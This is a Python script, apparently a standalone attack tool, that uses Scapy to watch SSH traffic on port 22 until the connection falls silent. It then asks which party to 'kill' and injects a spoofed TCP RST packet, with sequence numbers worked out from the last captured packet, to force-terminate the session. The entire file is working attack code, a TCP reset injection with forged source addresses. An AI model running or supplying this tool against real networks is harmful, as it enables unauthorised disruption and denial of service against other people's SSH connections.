#!/usr/bin/env python3
import time
import sys
from scapy.all import *

# Configuration
TARGET_PORT = 22  # SSH
STABILIZE_TIME = 30 # Seconds to wait for silence

# Globals to track connection state
last_packet_ts = 0
packet_seen = False
latest_packet = None

def print_headers(pkt):
    """Displays all IP and TCP header fields."""
    print("\n[!] No Application Data - Displaying Headers:")
    
    # IP Header
    if IP in pkt:
        ip = pkt[IP]
        print(f"    [IP Header] Ver:{ip.version} IHL:{ip.ihl} TOS:{ip.tos} Len:{ip.len} "
              f"ID:{ip.id} Flags:{ip.flags} Frag:{ip.frag} TTL:{ip.ttl} "
              f"Proto:{ip.proto} Chksum:{ip.chksum} Src:{ip.src} Dst:{ip.dst}")
    
    # TCP Header
    if TCP in pkt:
        tcp = pkt[TCP]
        print(f"    [TCP Header] Sport:{tcp.sport} Dport:{tcp.dport} Seq:{tcp.seq} "
              f"Ack:{tcp.ack} DataOfs:{tcp.dataofs} Reserved:{tcp.reserved} "
              f"Flags:{tcp.flags} Window:{tcp.window} Chksum:{tcp.chksum} UrgPtr:{tcp.urgptr}")
    print("-" * 60)

def packet_callback(pkt):
    """Called for every captured packet."""
    global last_packet_ts, packet_seen, latest_packet
    
    # Update state
    last_packet_ts = time.time()
    packet_seen = True
    latest_packet = pkt
    
    # Check if packet has application layer data (Payload)
    # In Scapy, if TCP payload is empty, len(pkt[TCP].payload) == 0
    if TCP in pkt and len(pkt[TCP].payload) == 0:
        print_headers(pkt)
    else:
        # Visual feedback for data packets
        sys.stdout.write(".")
        sys.stdout.flush()

def main():
    global last_packet_ts
    
    print(f"[*] Monitoring for established SSH connections on port {TARGET_PORT}...")
    print(f"[*] Waiting for connection to stabilize ({STABILIZE_TIME}s silence)...")

    # 1. Monitor and Wait for Stabilization
    while True:
        # Sniff for 1 second slices to allow checking the timer
        sniff(filter=f"tcp port {TARGET_PORT}", prn=packet_callback, store=0, timeout=1)
        
        if packet_seen:
            elapsed = time.time() - last_packet_ts
            
            # Stabilization Check
            if elapsed >= STABILIZE_TIME:
                print(f"\n\n[+] Connection Stabilized! No traffic for {elapsed:.1f} seconds.")
                break
            
            # Optional: Status update every few seconds during silence
            if elapsed > 1:
                sys.stdout.write(f"\r[*] Silence: {elapsed:.0f}s / {STABILIZE_TIME}s")
                sys.stdout.flush()

    # 2. User Options for Termination
    print("\n" + "="*40)
    print(f"Last Packet Captured:")
    print(f"Source: {latest_packet[IP].src}:{latest_packet[TCP].sport}")
    print(f"Dest:   {latest_packet[IP].dst}:{latest_packet[TCP].dport}")
    print("="*40)
    
    choice = input("\nWhich party do you want to kill? (1) Client or (2) Server: ").strip()

    # 3. Construct and Inject RST Packet
    # We need to determine which IP is Client and which is Server based on the last packet.
    # Usually, the side with port 22 is the Server.
    
    if latest_packet[TCP].sport == 22:
        server_ip = latest_packet[IP].src
        server_port = latest_packet[TCP].sport
        client_ip = latest_packet[IP].dst
        client_port = latest_packet[TCP].dport
        # The last packet was Server -> Client.
        # Server seq was X. Client expects X + len.
        # Client ack was Y. Server expects Y.
        seq_to_kill_client = latest_packet[TCP].ack 
        seq_to_kill_server = latest_packet[TCP].seq + len(latest_packet[TCP].payload)
    else:
        client_ip = latest_packet[IP].src
        client_port = latest_packet[TCP].sport
        server_ip = latest_packet[IP].dst
        server_port = latest_packet[TCP].dport
        # The last packet was Client -> Server.
        seq_to_kill_client = latest_packet[TCP].seq + len(latest_packet[TCP].payload)
        seq_to_kill_server = latest_packet[TCP].ack

    rst_pkt = None

    if choice == '1' or choice.lower() == 'client':
        print(f"[*] Killing Client ({client_ip})...")
        # To kill client, we spoof the Server sending a RST
        # The Seq number must match what the Client expects (packet.ack from a client-sent packet)
        rst_pkt = IP(src=server_ip, dst=client_ip) / \
                  TCP(sport=server_port, dport=client_port, flags="R", seq=seq_to_kill_client)
        
    elif choice == '2' or choice.lower() == 'server':
        print(f"[*] Killing Server ({server_ip})...")
        # To kill server, we spoof the Client sending a RST
        rst_pkt = IP(src=client_ip, dst=server_ip) / \
                  TCP(sport=client_port, dport=server_port, flags="R", seq=seq_to_kill_server)
    else:
        print("[-] Invalid selection. Exiting.")
        sys.exit(1)

    # 4. Send the packet
    if rst_pkt:
        send(rst_pkt, verbose=0)
        print("[+] RST Packet injected. Connection should be terminated.")

if __name__ == "__main__":
    # Ensure root privileges for sniffing/spoofing
    if os.geteuid() != 0:
        print("[-] This script requires sudo/root privileges.")
        sys.exit(1)
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Exiting.")